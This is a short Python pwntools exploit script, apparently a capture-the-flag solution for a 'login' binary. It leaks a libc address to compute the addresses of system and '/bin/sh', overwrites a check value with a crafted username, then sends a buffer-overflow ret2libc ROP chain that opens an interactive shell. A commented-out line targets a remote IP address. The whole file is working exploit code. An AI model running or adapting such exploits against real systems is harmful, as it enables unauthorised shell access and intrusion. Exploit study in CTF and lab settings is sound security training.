from pwn import *


p = process('./login')
# p = remote('59.110.164.72', 10000)
elf = ELF('./login')
lib = ELF('./libc-2.23.so')

p.recvuntil(b'0x')
stdin_addr = int(p.recv(12), 16)
base_addr = stdin_addr - lib.sym['_IO_2_1_stdin_']
sym_addr = base_addr + lib.sym['system']
bin_addr = base_addr + next(lib.search(b'/bin/sh'))
print(hex(base_addr))

payload = b'a' * 28 + p32(0x15CC15CC)
p.recvuntil(b'input the username:')
p.send(payload)

pop_rdi = 0x00000000004008c3
ret = 0x0000000000400599
payload = b'a' * 0x28 + p64(ret) + p64(pop_rdi) + p64(bin_addr) + p64(sym_addr)
# gdb.attach(p)
# pause()
p.sendline(payload)

p.interactive()
